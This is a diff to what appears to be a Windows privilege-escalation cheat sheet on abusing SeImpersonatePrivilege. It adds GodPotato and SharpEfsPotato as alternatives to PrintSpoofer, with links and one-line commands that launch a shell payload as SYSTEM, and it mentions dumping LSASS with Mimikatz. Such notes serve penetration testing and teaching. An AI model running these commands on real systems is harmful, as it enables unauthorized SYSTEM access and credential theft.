@@ -41,7 +41,7 @@ Local administrators will have all the permissions that exist, so they can do an
 
 ### SeImpersonatePrivilege
 
-This privilege allows you to impersonate other users like `nt authority\system`. This user can do anything, like dumping LSASS memory with mimikatz. Exploits exists that abuse this to get a shell:
+This privilege allows you to impersonate other users like `nt authority\system`. This user can do anything, like dumping LSASS memory with Mimikatz. Exploits exist that abuse this to get a shell:
 
 [https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe)
 
@@ -58,6 +58,18 @@ Install the latest PowerShell for new features and improvements! https://aka.ms/
 </strong>whoami
 <strong>nt authority\system
 </strong></code></pre>
+
+It's possible that this exploit above does not work, but some alternatives might work in these scenarios. First, there is [GodPotato](https://github.com/BeichenDream/GodPotato/releases) which you can download pre-compiled from the Releases, and execute:
+
+```powershell
+.\GodPotato-NET4.exe -cmd ".\shell.exe"
+```
+
+Lastly, there is also [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) which needs to be compiled by hand using [Visual Studio](https://visualstudio.microsoft.com/):
+
+```powershell
+.\SharpEfsPotato.exe -p C:\Windows\Tasks\shell.exe
+```
 
 ### Other Se...Privilege
 
